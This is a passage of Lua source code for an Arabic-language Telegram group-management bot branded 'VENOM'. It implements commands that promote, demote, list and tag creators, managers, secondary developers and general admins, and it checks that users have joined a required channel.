usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي @(.*)$") and CoSu(msg) then
local username = text:match("^تنزيل منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من الاساسيين'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي (%d+)$") and CoSu(msg) then
local userid = text:match("^تنزيل منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المنشئين' and BasicConstructor(msg) then
database:del(bot_id..'Constructor'..msg.chat_id_)
texts = ' 𖥔 تم مسح المنشئين '
send(msg.chat_id_, msg.id_, texts)
end

if text == ("المنشئين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n 𖥔 قائمة المنشئين \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنشئين") or text == ("صيح المنشئين") then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n 𖥔 وينكم تعالو يريدوكم بالجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- 「 '..v..' 」\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end
if text ==("المنشئ") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_," 𖥔 حساب المنشئ محذوف")
return false  
end
local UserName = (b.username_ or "SRC-VENOM")
send(msg.chat_id_, msg.id_," 𖥔 منشئ الجروب  ↚ ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
end

if text == "رفع منشئ" and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔  الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^رفع منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته منشئ'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔  الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المنشئين'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
------------------------------------------------------------------------
if text == 'مسح المدراء' and Constructor(msg) then
database:del(bot_id..'Manager'..msg.chat_id_)
texts = ' 𖥔 تم مسح المدراء '
send(msg.chat_id_, msg.id_, texts)
end
if text == ("المدراء") and Constructor(msg) then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n 𖥔 قائمة المدراء \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد مدراء"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمدراء") or text == ("صيح المدراء") then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n 𖥔 وينكم تعالو يريدوكم بالجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- 「 '..v..' 」\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد مدراء"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مدير @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مدير'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^رفع مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مدير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المدراء'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^تنزيل مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------ adddev2 sudog
if text == ("رفع مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_VENOM(extra, result, success)
database:sadd(bot_id.."Dev:ban:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","𖥔 تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_VENOM, nil)
return false 
end
if text and text:match("^رفع مطور ثانوي @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع مطور ثانوي @(.*)$")
function Function_VENOM(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Dev:ban:2", result.id_)
Reply_Status(msg,result.id_,"reply","𖥔 تم ترقيته مطور ثانوي في البوت")  
else
send(msg.chat_id_, msg.id_,"𖥔 لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_VENOM, nil)
return false 
end
if text and text:match("^رفع مطور ثانوي (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع مطور ثانوي (%d+)$")
database:sadd(bot_id.."Dev:ban:2", userid)
Reply_Status(msg,userid,"reply","𖥔 تم ترقيته مطور ثانوي في البوت")  
return false 
end
if text == ("تنزيل مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_VENOM(extra, result, success)
database:srem(bot_id.."Dev:ban:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","𖥔 تم تنزيله من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_VENOM, nil)
return false 
end
if text and text:match("^تنزيل مطور ثانوي @(.*)$") and SudoBot(msg) then
local username = text:match("^تنزيل مطور ثانوي @(.*)$")
function Function_VENOM(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:ban:2", result.id_)
Reply_Status(msg,result.id_,"reply","𖥔 تم تنزيله من المطور ثانويين")  
else
send(msg.chat_id_, msg.id_,"𖥔 لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_VENOM, nil)
return false
end  
if text and text:match("^تنزيل مطور ثانوي (%d+)$") and SudoBot(msg) then
local userid = text:match("^تنزيل مطور ثانوي (%d+)$")
database:srem(bot_id.."Dev:ban:2", userid)
Reply_Status(msg,userid,"reply","𖥔 تم تنزيله من المطور ثانويين")  
return false 
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:ban:2")
t = "\n 𖥔  قائمة مطورين الثانويين للبوت \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔  لا يوجد مطورين ثانويين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح الثانوين") and SudoBot(msg) then
database:del(bot_id.."Dev:ban:2")
send(msg.chat_id_, msg.id_, "\n 𖥔 تم مسح قائمة المطورين الثانوين  ")
end
------------------------------------------------------------------------
if text == ("رفع مدير عام") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'onall'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^رفع مدير عام @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مدير عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'onall'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مدير عام'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع مدير عام (%d+)$") and Constructor(msg) then
local userid = text:match("^رفع مدير عام (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'onall'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل مدير عام") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'onall'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير عام @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مدير عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'onall'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المدراء'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير عام (%d+)$") and Constructor(msg) then
local userid = text:match("^تنزيل مدير عام (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'onall'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("رفع ادمن عام") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'moall'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^رفع ادمن عام @(.*)$") and Constructor(msg) then
local username = text:match("^رفع ادمن عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
